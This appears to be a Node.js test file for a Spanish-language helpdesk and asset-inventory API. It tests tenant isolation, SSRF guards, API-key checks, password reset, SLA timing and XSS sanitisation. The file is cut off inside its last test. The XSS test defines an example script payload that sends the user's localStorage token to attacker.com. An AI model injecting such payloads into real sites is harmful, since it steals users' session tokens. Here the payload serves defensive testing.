const test = require('node:test');
const assert = require('node:assert/strict');
const { buildApp } = require('./app');
const { createToken } = require('./auth');

function buildUser(overrides = {}) {
  return {
    id: 99,
    name: 'Admin Test',
    email: 'admin@test.local',
    isActive: true,
    role: {
      id: 1,
      name: 'ADMIN',
      permissions: [
        { permission: { code: 'USERS_MANAGE' } },
        { permission: { code: 'ROLES_MANAGE' } },
        { permission: { code: 'ASSETS_VIEW' } },
        { permission: { code: 'ASSETS_MANAGE' } },
        { permission: { code: 'TICKETS_VIEW' } },
        { permission: { code: 'DASHBOARD_VIEW' } },
      ],
    },
    organizationId: 'org-test-uuid',
    organization: { id: 'org-test-uuid', slug: 'stic', isActive: true },
    passwordHash: 'ignored',
    ...overrides,
  };
}

test('GET /api/health returns ok', async () => {
  const app = buildApp({
    ticket: { count: async () => 0 },
    asset: { count: async () => 0, findMany: async () => [] },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/health`);
    const payload = await response.json();

    assert.equal(response.status, 200);
    assert.equal(payload.ok, true);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('PATCH /api/users/:id/status updates active flag', async () => {
  const authUser = buildUser();
  const updatedUser = {
    id: 2,
    name: 'Tecnico Nivel 1',
    username: 'tecnico.n1',
    email: 'nivel1@test.local',
    organizationId: authUser.organizationId,
    isActive: false,
    location: null,
    role: {
      name: 'LEVEL_1',
      permissions: [],
    },
  };

  const app = buildApp({
    user: {
      findUnique: async ({ where }) => {
        if (where.id === authUser.id) return authUser;
        if (where.id === 2) return { id: 2, organizationId: authUser.organizationId, role: { name: 'LEVEL_1', permissions: [] } };
        return null;
      },
      findFirst: async ({ where }) => {
        if (where.id === 2) return { id: 2, organizationId: authUser.organizationId, role: { name: 'LEVEL_1', permissions: [] } };
        if (where.id === authUser.id) return authUser;
        return null;
      },
      update: async ({ where, data }) => ({
        ...updatedUser,
        id: where.id,
        isActive: data.isActive,
      }),
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/users/2/status`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({ isActive: false }),
    });
    const payload = await response.json();

    assert.equal(response.status, 200);
    assert.equal(payload.id, 2);
    assert.equal(payload.isActive, false);
    assert.equal(payload.role, 'LEVEL_1');
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('PATCH /api/profile updates phone, email and avatar', async () => {
  const authUser = buildUser();
  const avatarUrl = 'data:image/png;base64,aGVsbG8=';
  const updatedUser = {
    ...authUser,
    phone: '3001234567',
    avatarUrl,
    location: null,
  };

  const app = buildApp({
    user: {
      findUnique: async ({ where }) => (where.id === authUser.id ? authUser : null),
      findFirst: async () => null,
      update: async () => updatedUser,
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/profile`, {
      method: 'PATCH',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({
        email: 'perfil@test.local',
        phone: '3001234567',
        avatarUrl,
      }),
    });
    const payload = await response.json();

    assert.equal(response.status, 200);
    assert.equal(payload.phone, '3001234567');
    assert.equal(payload.avatarUrl, avatarUrl);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('POST /api/discovery/scan validates IPv4 addresses and returns honest device profile', async () => {
  const authUser = buildUser();
  const app = buildApp({
    user: {
      findUnique: async ({ where }) => (where.id === authUser.id ? authUser : null),
    },
    asset: {
      findFirst: async () => null,
      findMany: async () => [],
    }
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    // 1. Invalid IP format test
    const resBad = await fetch(`http://127.0.0.1:${port}/api/discovery/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({ ip: 'invalid-ip-999' }),
    });
    const badPayload = await resBad.json();
    assert.equal(resBad.status, 400);
    assert.match(badPayload.error, /IPv4/i);

    // 2. SSRF Protection: Reject cloud metadata IP
    const resMetadata = await fetch(`http://127.0.0.1:${port}/api/discovery/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({ ip: '169.254.169.254' }),
    });
    const metaPayload = await resMetadata.json();
    assert.equal(resMetadata.status, 400);
    assert.match(metaPayload.error, /anti-SSRF|privadas/i);

    // 3. SSRF Protection: Reject public internet IP
    const resPublic = await fetch(`http://127.0.0.1:${port}/api/discovery/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({ ip: '8.8.8.8' }),
    });
    assert.equal(resPublic.status, 400);

    // 4. Valid Private IP test (honest discovery, no fake defaults)
    const resGood = await fetch(`http://127.0.0.1:${port}/api/discovery/scan`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({ ip: '10.0.5.56' }),
    });
    const goodPayload = await resGood.json();
    assert.equal(resGood.status, 200);
    assert.equal(goodPayload.success, true);
    assert.equal(goodPayload.ip, '10.0.5.56');
    assert.equal(goodPayload.isIdentified, false);
    assert.equal(goodPayload.detectionSource, 'NONE');
    assert.equal(goodPayload.brand, null);
    assert.equal(goodPayload.model, null);
    assert.equal(goodPayload.serialNumber, null);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('POST /api/discovery/register creates and updates network device with MAC deduplication', async () => {
  const authUser = buildUser();
  let storedAssets = [];

  const app = buildApp({
    user: {
      findUnique: async ({ where }) => (where.id === authUser.id ? authUser : null),
    },
    customer: {
      findFirst: async () => ({ id: 1, name: 'General', email: 'gen@test.local' }),
    },
    asset: {
      findFirst: async ({ where }) => {
        if (where.serialNumber) return storedAssets.find(a => a.serialNumber === where.serialNumber) || null;
        if (where.networkSummary?.contains) {
          const mac = where.networkSummary.contains;
          return storedAssets.find(a => (a.networkSummary || '').includes(mac)) || null;
        }
        if (where.ipAddress) return storedAssets.find(a => a.ipAddress === where.ipAddress) || null;
        if (where.hostname) return storedAssets.find(a => a.hostname === where.hostname) || null;
        return null;
      },
      create: async ({ data }) => {
        const item = { id: storedAssets.length + 1, ...data };
        storedAssets.push(item);
        return item;
      },
      update: async ({ where, data }) => {
        const idx = storedAssets.findIndex(a => a.id === where.id);
        if (idx >= 0) {
          storedAssets[idx] = { ...storedAssets[idx], ...data };
          return storedAssets[idx];
        }
        return data;
      }
    }
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    // 1. Initial registration for 10.0.5.56
    const res1 = await fetch(`http://127.0.0.1:${port}/api/discovery/register`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({
        hostname: 'HP-E731-PRINT',
        ipAddress: '10.0.5.56',
        mac: 'AA:BB:CC:DD:EE:FF',
        brand: 'HP',
        model: 'LaserJet MFP E731',
        serialNumber: 'CNB12345',
        deviceType: 'Impresora Multifuncional'
      }),
    });
    const payload1 = await res1.json();
    assert.equal(res1.status, 201);
    assert.equal(payload1.isNew, true);
    assert.equal(payload1.asset.hostname, 'HP-E731-PRINT');
    assert.match(payload1.asset.networkSummary, /AA:BB:CC:DD:EE:FF/);
    assert.equal(storedAssets.length, 1);

    // 2. Second registration of SAME device with NEW IP (10.0.5.80) -> IP change detection, NO duplicates!
    const res2 = await fetch(`http://127.0.0.1:${port}/api/discovery/register`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({
        hostname: 'HP-E731-PRINT',
        ipAddress: '10.0.5.80',
        mac: 'AA:BB:CC:DD:EE:FF',
        brand: 'HP',
        model: 'LaserJet MFP E731',
        serialNumber: 'CNB12345',
        deviceType: 'Impresora Multifuncional'
      }),
    });
    const payload2 = await res2.json();
    assert.equal(res2.status, 200);
    assert.equal(payload2.isNew, false);
    assert.equal(payload2.ipChanged, true);
    assert.equal(payload2.asset.ipAddress, '10.0.5.80');
    assert.equal(storedAssets.length, 1, 'Should NOT create duplicate asset when MAC/SN matches');
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('GET /api/organization-structure returns hierarchical tree of sedes, dependencias and oficinas', async () => {
  const authUser = buildUser();
  const mockSedes = [
    {
      id: 1,
      name: 'Palacio Municipal (Sede Central)',
      code: 'SED-01',
      address: 'Diagonal 15 No. 13-35',
      city: 'Sede Central',
      dependencias: [
        {
          id: 10,
          name: 'Dirección de TIC',
          code: 'TIC',
          oficinas: [
            { id: 101, name: 'Mesa de Ayuda (Piso 2)', code: 'OF-01', floor: 'Piso 2' }
          ]
        }
      ],
      oficinas: []
    }
  ];

  const app = buildApp({
    user: {
      findUnique: async () => authUser,
      findMany: async () => [authUser],
    },
    sede: {
      findMany: async () => mockSedes,
      create: async ({ data }) => ({ id: 2, ...data })
    },
    dependencia: {
      findMany: async () => [],
      create: async ({ data }) => ({ id: 20, ...data })
    },
    oficina: {
      findMany: async () => [],
      create: async ({ data }) => ({ id: 200, ...data })
    },
    asset: {
      findMany: async () => [
        { id: 1, hostname: 'STIC-PC-01', location: 'Palacio Municipal (Sede Central) - Dirección de TIC - Mesa de Ayuda (Piso 2)' }
      ]
    },
    location: {
      findMany: async () => [],
      findFirst: async () => null,
      create: async ({ data }) => ({ id: 1, ...data })
    }
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const res = await fetch(`http://127.0.0.1:${port}/api/organization-structure`, {
      headers: {
        Authorization: `Bearer ${createToken(authUser)}`,
      },
    });

    const data = await res.json();
    assert.equal(res.status, 200);
    assert.equal(Array.isArray(data.tree), true);
    assert.equal(data.tree.length, 1);
    assert.equal(data.tree[0].name, 'Palacio Municipal (Sede Central)');
    assert.equal(data.tree[0].dependencias[0].name, 'Dirección de TIC');
    assert.equal(data.tree[0].dependencias[0].oficinas[0].name, 'Mesa de Ayuda (Piso 2)');
    assert.equal(data.tree[0].dependencias[0].oficinas[0].assetCount, 1);
    assert.equal(data.stats.totalSedes, 1);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('PUT /api/tickets/:id records audit activity when asset is associated', async () => {
  const authUser = buildUser({
    role: {
      id: 1,
      name: 'ADMIN',
      permissions: [
        { permission: { code: 'TICKETS_VIEW' } },
        { permission: { code: 'TICKETS_EDIT' } },
      ],
    },
  });

  const existingTicket = {
    id: 2,
    title: 'ACCESO A DOCUMENT',
    description: 'Solicitud de acceso',
    priority: 'MEDIA',
    status: 'IN_PROGRESS',
    ticketType: 'Solicitud',
    category: 'General',
    locationId: 1,
    assetId: null,
    responsibleUserIds: '[]',
    assignedToId: null,
    secondaryAssignedToId: null,
    createdById: authUser.id,
    organizationId: authUser.organizationId,
    resolvedAt: null,
    closedAt: null,
  };

  const createdActivities = [];

  const app = buildApp({
    user: {
      findUnique: async () => authUser,
      findMany: async () => [authUser],
    },
    ticket: {
      findUnique: async () => existingTicket,
      findFirst: async () => existingTicket,
      findMany: async () => [existingTicket],
      update: async ({ data }) => ({ ...existingTicket, ...data, customer: null, assignedTo: null, secondaryAssignedTo: null, createdBy: null }),
    },
    asset: {
      findMany: async () => [
        { id: 14, hostname: 'STIC22206', brand: 'HP', model: 'Compaq Elite 8300' }
      ],
    },
    location: {
      findMany: async () => [],
    },
    ticketActivity: {
      findFirst: async () => null,
      findMany: async () => createdActivities,
      createMany: async ({ data }) => {
        createdActivities.push(...data);
        return { count: data.length };
      },
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const res = await fetch(`http://127.0.0.1:${port}/api/tickets/2`, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({
        title: 'ACCESO A DOCUMENT',
        assetId: 14,
      }),
    });

    assert.equal(res.status, 200);
    assert.equal(createdActivities.length >= 1, true);
    const assetActivity = createdActivities.find(a => a.field === 'Elemento Asociado');
    assert.ok(assetActivity, 'Should create activity for Elemento Asociado');
    assert.equal(assetActivity.oldValue, 'Sin elemento asociado');
    assert.equal(assetActivity.newValue.includes('STIC22206'), true);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('MULTI-TENANT ISOLATION: User of Org A cannot access or modify Org B resources', async () => {
  const userOrgA = buildUser({
    id: 101,
    name: 'Admin Org A',
    organizationId: 'org-aaa-uuid',
    organization: { id: 'org-aaa-uuid', slug: 'org-a', isActive: true },
    role: {
      id: 1,
      name: 'ADMIN',
      permissions: [
        { permission: { code: 'USERS_MANAGE' } },
        { permission: { code: 'ROLES_MANAGE' } },
        { permission: { code: 'ASSETS_VIEW' } },
        { permission: { code: 'ASSETS_MANAGE' } },
        { permission: { code: 'TICKETS_VIEW' } },
        { permission: { code: 'TICKETS_EDIT' } },
        { permission: { code: 'TICKETS_CONFIGURE' } },
        { permission: { code: 'DASHBOARD_VIEW' } },
      ],
    },
  });

  const ticketOrgB = {
    id: 500,
    title: 'Ticket Confidential Org B',
    description: 'Secret data',
    organizationId: 'org-bbb-uuid',
    status: 'NEW',
    createdById: 202,
  };

  const userOrgB = {
    id: 202,
    name: 'User Org B',
    email: 'userb@orgb.local',
    organizationId: 'org-bbb-uuid',
    isActive: true,
    role: { id: 2, name: 'USUARIO ESTANDAR', permissions: [] },
  };

  const assetOrgB = {
    id: 303,
    hostname: 'SEC-SRV-ORGB',
    ipAddress: '10.0.1.100',
    organizationId: 'org-bbb-uuid',
  };

  const categoryOrgB = {
    id: 404,
    name: 'Secret Category B',
    ticketType: 'Incidencia',
    organizationId: 'org-bbb-uuid',
  };

  const cannedOrgB = {
    id: 606,
    title: 'Canned B',
    content: 'Secret',
    organizationId: 'org-bbb-uuid',
  };

  const app = buildApp({
    user: {
      findUnique: async ({ where }) => (where.id === userOrgA.id ? userOrgA : null),
      findFirst: async ({ where }) => {
        if (where.id === userOrgB.id && (!where.organizationId || where.organizationId === userOrgB.organizationId)) {
          return userOrgB;
        }
        return null;
      },
    },
    ticket: {
      findMany: async () => [],
      findFirst: async ({ where }) => {
        if (where.id === ticketOrgB.id && (!where.organizationId || where.organizationId === ticketOrgB.organizationId)) {
          return ticketOrgB;
        }
        return null;
      },
    },
    asset: {
      findFirst: async ({ where }) => {
        if (where.id === assetOrgB.id && (!where.organizationId || where.organizationId === assetOrgB.organizationId)) {
          return assetOrgB;
        }
        return null;
      },
    },
    ticketCategory: {
      findFirst: async ({ where }) => {
        if (where.id === categoryOrgB.id && (!where.organizationId || where.organizationId === categoryOrgB.organizationId)) {
          return categoryOrgB;
        }
        return null;
      },
    },
    cannedResponse: {
      findFirst: async ({ where }) => {
        if (where.id === cannedOrgB.id && (!where.organizationId || where.organizationId === cannedOrgB.organizationId)) {
          return cannedOrgB;
        }
        return null;
      },
    },
  });

  const server = app.listen(0);
  const { port } = server.address();
  const tokenA = createToken(userOrgA);

  try {
    // 1. Org A user tries to GET Org B ticket -> 404
    const resTicket = await fetch(`http://127.0.0.1:${port}/api/tickets/500`, {
      headers: { Authorization: `Bearer ${tokenA}` },
    });
    assert.equal(resTicket.status, 404);

    // 2. Org A user tries to PUT Org B ticket -> 404
    const resPutTicket = await fetch(`http://127.0.0.1:${port}/api/tickets/500`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${tokenA}` },
      body: JSON.stringify({ title: 'Hacked' }),
    });
    assert.equal(resPutTicket.status, 404);

    // 3. Org A user tries to GET Org B user -> 404
    const resUser = await fetch(`http://127.0.0.1:${port}/api/users/202`, {
      headers: { Authorization: `Bearer ${tokenA}` },
    });
    assert.equal(resUser.status, 404);

    // 4. Org A user tries to GET Org B asset -> 404
    const resAsset = await fetch(`http://127.0.0.1:${port}/api/assets/303`, {
      headers: { Authorization: `Bearer ${tokenA}` },
    });
    assert.equal(resAsset.status, 404);

    // 5. Org A user tries to DELETE Org B category -> 404
    const resCat = await fetch(`http://127.0.0.1:${port}/api/categories/404`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${tokenA}` },
    });
    assert.equal(resCat.status, 404);

    // 6. Org A user tries to DELETE Org B canned response -> 404
    const resCanned = await fetch(`http://127.0.0.1:${port}/api/canned-responses/606`, {
      method: 'DELETE',
      headers: { Authorization: `Bearer ${tokenA}` },
    });
    assert.equal(resCanned.status, 404);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('FAIL-CLOSED: POST /api/assets/sync requires AGENT_API_KEY and rejects unauthorized calls', async () => {
  const originalKey = process.env.AGENT_API_KEY;

  const app = buildApp({
    asset: {
      findFirst: async () => null,
      create: async ({ data }) => ({ id: 1, ...data }),
    }
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    // 1. When AGENT_API_KEY is not set -> must return 503 Fail-Closed
    delete process.env.AGENT_API_KEY;
    const resNoEnv = await fetch(`http://127.0.0.1:${port}/api/assets/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ hostname: 'TEST-AGENT' }),
    });
    assert.equal(resNoEnv.status, 503);

    // 2. When AGENT_API_KEY is configured -> missing header returns 401
    process.env.AGENT_API_KEY = 'secret-agent-key-123';
    const resMissingHeader = await fetch(`http://127.0.0.1:${port}/api/assets/sync`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ hostname: 'TEST-AGENT' }),
    });
    assert.equal(resMissingHeader.status, 401);

    // 3. Invalid key header returns 401
    const resWrongHeader = await fetch(`http://127.0.0.1:${port}/api/assets/sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-agent-key': 'wrong-key-attempt',
      },
      body: JSON.stringify({ hostname: 'TEST-AGENT' }),
    });
    assert.equal(resWrongHeader.status, 401);
  } finally {
    if (originalKey !== undefined) {
      process.env.AGENT_API_KEY = originalKey;
    } else {
      delete process.env.AGENT_API_KEY;
    }
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('SERVER-SIDE XSS SANITIZATION: Strips script tags, iframes and onerror handlers from tickets', async () => {
  const authUser = buildUser({
    role: {
      id: 1,
      name: 'ADMIN',
      permissions: [
        { permission: { code: 'TICKETS_CREATE' } },
        { permission: { code: 'TICKETS_EDIT' } },
        { permission: { code: 'TICKETS_VIEW' } }
      ]
    }
  });

  let savedTicket = null;

  const app = buildApp({
    user: {
      findUnique: async () => authUser,
      findMany: async () => [authUser],
    },
    ticket: {
      create: async ({ data }) => {
        savedTicket = { id: 77, ...data, customer: null, asset: null, assignedTo: null, secondaryAssignedTo: null, createdBy: null };
        return savedTicket;
      },
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const maliciousPayload = '<script>fetch("https://attacker.com/steal?token="+localStorage.getItem("token"))</script><img src=x onerror=alert(1)><b>Descripción con formato</b>';

    const res = await fetch(`http://127.0.0.1:${port}/api/tickets`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${createToken(authUser)}`,
      },
      body: JSON.stringify({
        title: 'Ticket con intento XSS',
        description: maliciousPayload,
      }),
    });

    assert.equal(res.status, 201);
    assert.ok(savedTicket);
    assert.equal(savedTicket.description.includes('<script>'), false);
    assert.equal(savedTicket.description.includes('onerror='), false);
    assert.equal(savedTicket.description.includes('<b>Descripción con formato</b>'), true);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('ERROR OPACITY: 500 internal errors return generic message without leaking details', async () => {
  const authUser = buildUser();

  const app = buildApp({
    user: {
      findUnique: async () => authUser,
      findMany: async () => {
        throw new Error('PrismaClientKnownRequestError: relation "SecretInternalTable" does not exist in schema "prod_db"');
      },
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    const res = await fetch(`http://127.0.0.1:${port}/api/users`, {
      headers: { Authorization: `Bearer ${createToken(authUser)}` },
    });

    assert.equal(res.status, 500);
    const body = await res.json();
    assert.equal(body.error, 'Ocurrió un error interno en el servidor. Por favor, intente nuevamente.');
    assert.equal(JSON.stringify(body).includes('SecretInternalTable'), false);
    assert.equal(JSON.stringify(body).includes('prod_db'), false);
  } finally {
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('PASSWORD RESET FLOW: Generates HMAC token and updates password securely', async () => {
  process.env.ENABLE_RESET_DEBUG = 'true';
  const { hashPassword } = require('./auth');
  const initialPassword = 'OldPassword123!';
  const initialHash = hashPassword(initialPassword);

  const testUser = {
    id: 55,
    name: 'Usuario Reset',
    email: 'reset.user@test.local',
    username: 'reset.user',
    passwordHash: initialHash,
    isActive: true,
    organizationId: null,
    role: { name: 'USUARIO ESTANDAR', permissions: [] },
  };

  let currentHash = initialHash;

  const app = buildApp({
    user: {
      findUnique: async ({ where }) => {
        if (where.id === testUser.id) return { ...testUser, passwordHash: currentHash };
        return null;
      },
      findFirst: async ({ where }) => {
        if (where.email === testUser.email) return { ...testUser, passwordHash: currentHash };
        return null;
      },
      update: async ({ where, data }) => {
        if (where.id === testUser.id) {
          currentHash = data.passwordHash;
          return { ...testUser, passwordHash: currentHash };
        }
        return data;
      }
    },
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    // 1. Request password reset
    const resForgot = await fetch(`http://127.0.0.1:${port}/api/auth/forgot-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: testUser.email }),
    });
    assert.equal(resForgot.status, 200);
    const forgotData = await resForgot.json();
    assert.ok(forgotData.resetToken, 'Non-production environment should return resetToken for testing');

    const resetToken = forgotData.resetToken;

    // 2. Reset password with token
    const resReset = await fetch(`http://127.0.0.1:${port}/api/auth/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: resetToken, newPassword: 'NewSecurePassword456!' }),
    });
    assert.equal(resReset.status, 200);

    // 3. Login with new password
    const resLogin = await fetch(`http://127.0.0.1:${port}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: testUser.email, password: 'NewSecurePassword456!' }),
    });
    assert.equal(resLogin.status, 200);

    // 4. Old reset token is now invalid (single-use because passwordHash changed)
    const resReused = await fetch(`http://127.0.0.1:${port}/api/auth/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: resetToken, newPassword: 'AnotherPassword789!' }),
    });
    assert.equal(resReused.status, 500); // verifyPasswordResetToken throws error caught as 500/400
  } finally {
    delete process.env.ENABLE_RESET_DEBUG;
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

test('PER-ORGANIZATION AGENT API KEY: Validates org-specific key and rejects mismatches', async () => {
  const originalAcmeKey = process.env.AGENT_API_KEY_ACME;
  process.env.AGENT_API_KEY_ACME = 'acme-secret-999';

  let syncedAsset = null;

  const app = buildApp({
    organization: {
      findUnique: async ({ where }) => {
        if (where.slug === 'acme') return { id: 'org-acme-uuid', slug: 'acme', name: 'ACME Corp' };
        return null;
      }
    },
    customer: {
      findFirst: async () => ({ id: 1, name: 'Default', email: 'default@test.local' })
    },
    asset: {
      findFirst: async () => null,
      create: async ({ data }) => {
        syncedAsset = { id: 10, ...data };
        return syncedAsset;
      }
    }
  });

  const server = app.listen(0);
  const { port } = server.address();

  try {
    // 1. Sync with valid org key
    const resValid = await fetch(`http://127.0.0.1:${port}/api/assets/sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-organization-slug': 'acme',
        'x-agent-key': 'acme-secret-999',
      },
      body: JSON.stringify({ hostname: 'ACME-SRV-01', organizationSlug: 'acme' }),
    });
    assert.equal(resValid.status, 200);
    assert.ok(syncedAsset);
    assert.equal(syncedAsset.organizationId, 'org-acme-uuid');

    // 2. Sync with mismatched org key
    const resMismatch = await fetch(`http://127.0.0.1:${port}/api/assets/sync`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-organization-slug': 'acme',
        'x-agent-key': 'wrong-key',
      },
      body: JSON.stringify({ hostname: 'ACME-SRV-02', organizationSlug: 'acme' }),
    });
    assert.equal(resMismatch.status, 401);
  } finally {
    if (originalAcmeKey !== undefined) {
      process.env.AGENT_API_KEY_ACME = originalAcmeKey;
    } else {
      delete process.env.AGENT_API_KEY_ACME;
    }
    await new Promise((resolve, reject) => {
      server.close((error) => (error ? reject(error) : resolve()));
    });
  }
});

// ==========================================
// NUEVAS PRUEBAS OFICIALES ANS & ANALYTICS 2026
// ==========================================

const { calculateBusinessMinutes, addBusinessMinutes } = require('./lib/business-time');
const { evaluateTicketAns, getDefaultPolicy } = require('./lib/ans-engine');
const { getTicketPerformanceMetrics } = require('./lib/ticket-analytics-service');

test('ANS: BusinessTimeService computes minutes strictly during work hours (08:00-17:00, Mon-Fri)', () => {
  // Lunes 08:00 a Lunes 10:00 = 120 minutos hábiles
  const mondayStart = new Date('2026-09-07T08:00:00');
  const mondayEnd = new Date('2026-09-07T10:00:00');
  const minsSameDay = calculateBusinessMinutes(mondayStart, mondayEnd);
  assert.equal(minsSameDay, 120);

  // Sábado a Domingo = 0 minutos hábiles
  const sat = new Date('2026-09-12T10:00:00');
  const sun = new Date('2026-09-13T16:00:00');
  const weekendMins = calculateBusinessMinutes(sat, sun);
  assert.equal(weekendMins, 0);

  // Viernes 16:00 a Lunes 09:00 = 60 min viernes (16-17) + 60 min lunes (08-09) = 120 min
  const fri = new Date('2026-09-04T16:00:00');
  const mon = new Date('2026-09-07T09:00:00');
  const weekendSpanMins = calculateBusinessMinutes(fri, mon);
  assert.equal(weekendSpanMins, 120);
});

test('ANS: AnsEngine evaluates compliance and breach without artificial minimum percentages', () => {
  const createdAt = new Date('2026-09-07T08:00:00');
  const firstResponseAt = new Date('2026-09-07T08:45:00'); // 45 min (límite ALTO = 60 min) -> Cumplido
  const resolvedAt = new Date('2026-09-07T14:00:00');      // 360 min (límite ALTO = 480 min) -> Cumplido

  const ticket = {
    createdAt,
    priority: 'ALTO',
    firstResponseAt,
    resolvedAt,
    status: 'RESOLVED',
    responseAnsMinutes: 60,
    resolutionAnsMinutes: 480
  };

  const evalResult = evaluateTicketAns(ticket);
  assert.equal(evalResult.responseCompliant, true);
  assert.equal(evalResult.resolutionCompliant, true);
  assert.equal(evalResult.isOverdue, false);
  assert.equal(evalResult.ansStatus, 'COMPLETED');
});

test('ANALYTICS: TicketAnalyticsService calculates P50/P90, true FCR, and separate ANS response/resolution', async () => {
  const mockTickets = [
    {
      id: 1,
      title: 'Ticket 1',
      priority: 'ALTO',
      status: 'RESOLVED',
      ticketType: 'Incidencia',
      category: 'Redes',
      createdAt: new Date('2026-09-07T08:00:00'),
      firstResponseAt: new Date('2026-09-07T08:20:00'), // 20 min
      resolvedAt: new Date('2026-09-07T10:00:00'),      // 120 min (2h)
      reopenCount: 0,
      assignedToId: 10,
      responseAnsMinutes: 60,
      resolutionAnsMinutes: 480
    },
    {
      id: 2,
      title: 'Ticket 2',
      priority: 'MEDIO',
      status: 'RESOLVED',
      ticketType: 'Solicitud',
      category: 'Software',
      createdAt: new Date('2026-09-07T08:00:00'),
      firstResponseAt: new Date('2026-09-07T09:00:00'), // 60 min
      resolvedAt: new Date('2026-09-07T16:00:00'),      // 480 min (8h)
      reopenCount: 0,
      assignedToId: 10,
      responseAnsMinutes: 120,
      resolutionAnsMinutes: 1440
    }
  ];

  const mockPrisma = {
    ticket: {
      count: async () => mockTickets.length,
      findMany: async () => mockTickets,
      groupBy: async () => []
    },
    user: {
      findMany: async () => [{ id: 10, name: 'Tech 1', email: 'tech1@test.com', role: { name: 'Técnico' } }]
    },
    sede: { findMany: async () => [] },
    dependencia: { findMany: async () => [] },
    oficina: { findMany: async () => [] }
  };

  const metrics = await getTicketPerformanceMetrics(mockPrisma, {
    organizationId: 'org-test',
    startDate: '2026-09-01',
    endDate: '2026-09-30'
  });

  assert.ok(metrics.summary);
  assert.equal(metrics.summary.total, 2);
  assert.equal(metrics.summary.responseAnsCompliance, 100);
  assert.equal(metrics.summary.resolutionAnsCompliance, 100);
  assert.equal(metrics.summary.fcrRate, 100);
  assert.equal(metrics.summary.mttaP50Minutes, 60);
  assert.equal(typeof metrics.summary.mttrP50Hours, 'number');
});

test('SECURITY: getEffectiveRole ignores unprivileged role impersonation header', () => {
  const { getEffectiveRole } = require('./lib/middleware');
  
  // Usuario estándar intentando enviar x-view-as-role: ADMIN
  const reqUnprivileged = {
    auth: {
      user: {
        id: 5,
        role: 'USUARIO ESTANDAR',
        permissions: ['TICKETS_VIEW']
      }
    },
    headers: {
      'x-view-as-role': 'ADMIN'
    },
    query: {}
  };
  const roleResult = getEffectiveRole(reqUnprivileged);
  assert.equal(roleResult, 'USUARIO ESTANDAR'); // Impersonación bloqueada

  // Usuario Administrador tiene permiso para simular
  const reqAdmin = {
    auth: {
      user: {
        id: 1,
        role: 'ADMIN',
        permissions: ['ROLE_VIEW_AS', 'ANALYTICS_VIEW']
      }
    },
    headers: {
